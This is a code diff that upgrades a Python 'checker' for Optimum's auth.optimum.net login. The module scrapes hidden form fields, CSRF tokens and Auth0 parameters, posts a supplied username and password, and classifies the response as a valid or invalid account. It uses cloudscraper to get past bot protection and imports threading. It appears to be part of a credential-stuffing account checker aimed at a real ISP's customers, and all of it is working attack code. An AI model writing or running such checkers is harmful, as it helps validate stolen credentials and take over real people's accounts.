@@ -1,10 +1,10 @@
 """
-Checker for Optimum (auth.optimum.net) – Auth0-based login.
+Checker for Optimum (auth.optimum.net) – Auth0 login with full token extraction.
 """
 import re
 import threading
 from typing import Tuple
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse, parse_qs
 
 try:
     import cloudscraper
@@ -37,41 +37,82 @@ def check(username: str, password: str) -> Tuple[bool, str]:
     })
 
     try:
+        # Step 1: GET login page – extract all hidden fields
         resp = session.get(LOGIN_URL, timeout=TIMEOUT)
         if resp.status_code != 200:
             return False, f"Failed to load login page (HTTP {resp.status_code})"
 
         html = resp.text
-        form_action = LOGIN_URL
+
+        # Find the form action – it may be a relative path
         form_match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
         if form_match:
             form_action = urljoin(BASE_URL, form_match.group(1))
+        else:
+            # If no form, try to find the login endpoint from a script (Auth0)
+            # Look for "connection" or "login" endpoint in JavaScript
+            action_match = re.search(r'url:\s*["\']([^"\']+login[^"\']*)["\']', html, re.I)
+            if action_match:
+                form_action = urljoin(BASE_URL, action_match.group(1))
+            else:
+                form_action = LOGIN_URL
 
+        # Extract all hidden inputs (including state, client_id, csrf, etc.)
         payload = {"username": username, "password": password}
         hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]+)"'
         for name, value in re.findall(hidden_pattern, html, re.I):
             if name.lower() not in ["username", "password"]:
                 payload[name] = value
 
+        # Also check for CSRF token in meta tags
         csrf_meta = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
         if csrf_meta:
             payload["csrf_token"] = csrf_meta.group(1)
 
+        # If no hidden fields, Auth0 might use a JSON payload – try to extract from script
+        if not any(k for k in payload if k not in ["username", "password"]):
+            # Look for a JSON object with login parameters
+            script_match = re.search(r'var\s+config\s*=\s*({[^;]+});', html, re.I)
+            if script_match:
+                try:
+                    import json
+                    config = json.loads(script_match.group(1))
+                    if "state" in config:
+                        payload["state"] = config["state"]
+                    if "client_id" in config:
+                        payload["client_id"] = config["client_id"]
+                    if "connection" in config:
+                        payload["connection"] = config["connection"]
+                except:
+                    pass
+
+        # Step 2: POST credentials
         post_resp = session.post(form_action, data=payload, allow_redirects=False, timeout=TIMEOUT)
 
+        # Step 3: Determine success
         if post_resp.status_code in (301, 302):
             location = post_resp.headers.get("Location", "").lower()
-            if any(x in location for x in ["callback", "dashboard", "home", "account"]):
+            if any(x in location for x in ["callback", "dashboard", "home", "account", "index"]):
                 return True, "Login successful (redirect to dashboard)"
             else:
-                return False, "Login failed (redirected back to login)"
+                # If redirect is back to login, it's a failure
+                if "login" in location:
+                    return False, "Login failed (redirected back to login)"
+                return False, f"Login failed (unexpected redirect to {location})"
 
+        # If status 200, inspect HTML
         html = post_resp.text.lower()
         if "invalid" in html or "incorrect" in html or "error" in html:
+            # Try to extract the exact error message
+            error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', post_resp.text, re.I | re.S)
+            if error_match:
+                return False, f"Login failed: {error_match.group(1).strip()}"
             return False, "Invalid credentials"
+
         if "logout" in html or "dashboard" in html or "welcome" in html:
             return True, "Login successful"
-        if "username" in html and "password" in html:
+
+        if "username" in html and "password" in html and "login" in html:
             return False, "Login failed – still on login page"
 
         return False, "Login failed – unknown response"
